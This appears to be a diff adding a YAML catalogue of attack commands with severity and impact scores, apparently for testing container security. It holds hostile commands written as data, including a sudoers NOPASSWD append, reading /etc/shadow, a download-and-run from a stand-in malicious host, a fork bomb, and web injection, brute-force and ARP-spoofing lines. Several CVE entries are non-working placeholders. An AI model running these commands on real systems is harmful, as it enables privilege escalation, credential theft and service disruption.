@@ -1,0 +1,126 @@
+attacks:
+  - name: "Privilege Escalation via Sudo Misconfiguration"
+    command: "echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers && sudo su"
+    severity: "Critical"
+    impact: -10
+    description: "Exploits misconfigured sudo permissions to gain root access."
+
+  - name: "Access Sensitive Files"
+    command: "cat /etc/shadow"
+    severity: "High"
+    impact: -5
+    description: "Attempts to read the shadow password file containing hashed passwords."
+
+  - name: "Ping Localhost"
+    command: "ping -c 4 127.0.0.1"
+    severity: "Low"
+    impact: -1
+    description: "Tests if the container can ping the localhost successfully."
+
+  - name: "Download and Execute Malware"
+    command: "wget http://malicious-site.com/malware.sh -O /tmp/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh"
+    severity: "Critical"
+    impact: -10
+    description: "Downloads and executes a malicious script within the container."
+
+  - name: "Resource Exhaustion"
+    command: "dd if=/dev/zero of=/dev/null bs=1M count=10000"
+    severity: "Medium"
+    impact: -3
+    description: "Attempts to exhaust CPU resources by performing intensive operations."
+
+  - name: "Fork Bomb"
+    command: ":(){ :|:& };:"
+    severity: "Critical"
+    impact: -10
+    description: "Executes a fork bomb to crash the container by exhausting system processes."
+
+  - name: "Network Scan"
+    command: "nmap -sS 127.0.0.1"
+    severity: "High"
+    impact: -5
+    description: "Scans the localhost for open network ports."
+
+  - name: "Environment Variable Dump"
+    command: "printenv"
+    severity: "Medium"
+    impact: -3
+    description: "Lists all environment variables set in the container."
+
+  - name: "Database Dump"
+    command: "mysql -u root -e 'SHOW DATABASES;'"
+    severity: "High"
+    impact: -5
+    description: "Attempts to access the database and retrieve a list of all databases."
+
+  - name: "Modify Critical File"
+    command: "echo 'malicious_entry' >> /etc/hosts"
+    severity: "Critical"
+    impact: -10
+    description: "Modifies a critical system file to insert malicious entries."
+
+  - name: "Exploit CVE-2024-1086"
+    command: "echo 'Exploit code for CVE-2024-1086' > /tmp/exploit.c && gcc /tmp/exploit.c -o /tmp/exploit && /tmp/exploit"
+    severity: "Critical"
+    impact: -10
+    description: "Attempts to exploit a known Linux kernel vulnerability for privilege escalation."
+
+  - name: "SQL Injection"
+    command: "curl 'http://localhost/vulnerable_endpoint?param=' OR '1'='1'"
+    severity: "High"
+    impact: -5
+    description: "Tests for SQL injection vulnerabilities in web applications running within the container."
+
+  - name: "Cross-Site Scripting (XSS)"
+    command: "curl 'http://localhost/vulnerable_endpoint' -d 'input=<script>alert(1)</script>'"
+    severity: "High"
+    impact: -5
+    description: "Tests for XSS vulnerabilities in web applications running within the container."
+
+  - name: "Directory Traversal"
+    command: "curl 'http://localhost/vulnerable_endpoint?file=../../../../etc/passwd'"
+    severity: "High"
+    impact: -5
+    description: "Attempts to access sensitive files via directory traversal in web applications."
+
+  - name: "Remote Code Execution via Deserialization"
+    command: "curl 'http://localhost/vulnerable_endpoint' -d 'payload=malicious_serialized_object'"
+    severity: "Critical"
+    impact: -10
+    description: "Tests for insecure deserialization vulnerabilities leading to remote code execution."
+
+  - name: "Brute Force SSH Login"
+    command: "hydra -l root -P /path/to/passwords.txt ssh://localhost"
+    severity: "High"
+    impact: -5
+    description: "Attempts to brute force SSH login using a list of common passwords."
+
+  - name: "Man-in-the-Middle Attack"
+    command: "arpspoof -i eth0 -t <target_ip> <gateway_ip>"
+    severity: "Critical"
+    impact: -10
+    description: "Performs ARP spoofing to intercept network traffic between the container and the network."
+
+  - name: "Denial of Service via HTTP Flood"
+    command: "ab -n 10000 -c 100 http://localhost/"
+    severity: "High"
+    impact: -5
+    description: "Performs an HTTP flood attack to overwhelm the web server running within the container."
+
+  - name: "Exploit XZ Utils Backdoor (CVE-2024-3094)"
+    command: "xz --backdoor-command"
+    severity: "Critical"
+    impact: -10
+    description: "Attempts to exploit the backdoor in XZ Utils to gain unauthorized access."
+
+  - name: "Exploit Netfilter Vulnerability (CVE-2024-1086)"
+    command: "netfilter_exploit_code"
+    severity: "Critical"
+    impact: -10
+    description: "Attempts to exploit a vulnerability in Netfilter for privilege escalation."
+
+  - name: "Exploit Media Pipeline Vulnerability (CVE-2024-39481)"
+    command: "media_pipeline_exploit_code"
+    severity: "Critical"
+    impact: -10
+    description: "Attempts to exploit a vulnerability in the media pipeline for unauthorized access."
